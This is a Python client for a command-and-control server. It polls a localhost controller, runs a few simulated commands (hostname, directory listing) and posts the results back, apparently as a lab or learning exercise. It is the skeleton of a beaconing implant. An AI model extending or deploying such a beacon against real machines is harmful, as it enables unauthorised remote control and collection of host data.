import aiohttp
import asyncio
import uuid
import sys

# Ensure compatibility with Windows event loop
if sys.platform.startswith("win"):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

SERVER_URL = "http://localhost:8080"
CLIENT_ID = str(uuid.uuid4())  # Generate a unique client ID

async def register():
    """Registers the client with the C2 server."""
    async with aiohttp.ClientSession() as session:
        async with session.post(f"{SERVER_URL}/register", json={"client_id": CLIENT_ID}) as resp:
            print(await resp.json())

async def get_command():
    """Polls the server for new commands."""
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{SERVER_URL}/command/{CLIENT_ID}") as resp:
            response = await resp.json()
            return response.get("command")

async def send_result(result):
    """Sends execution results back to the server."""
    async with aiohttp.ClientSession() as session:
        async with session.post(f"{SERVER_URL}/result", json={"client_id": CLIENT_ID, "result": result}) as resp:
            print(await resp.json())

async def execute_command(command):
    """Executes the given command (simulated)."""
    if command == "ping":
        return "pong"
    elif command == "hostname":
        import socket
        return socket.gethostname()
    elif command == "list_files":
        import os
        return str(os.listdir("."))
    else:
        return "Unknown command"

async def client_loop():
    """Main loop for the client."""
    await register()

    while True:
        command = await get_command()
        if command:
            print(f"Executing command: {command}")
            result = await execute_command(command)
            await send_result(result)
        await asyncio.sleep(5)  # Polling interval

if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    try:
        asyncio.run(client_loop())
    except KeyboardInterrupt:
        print("Client stopped.")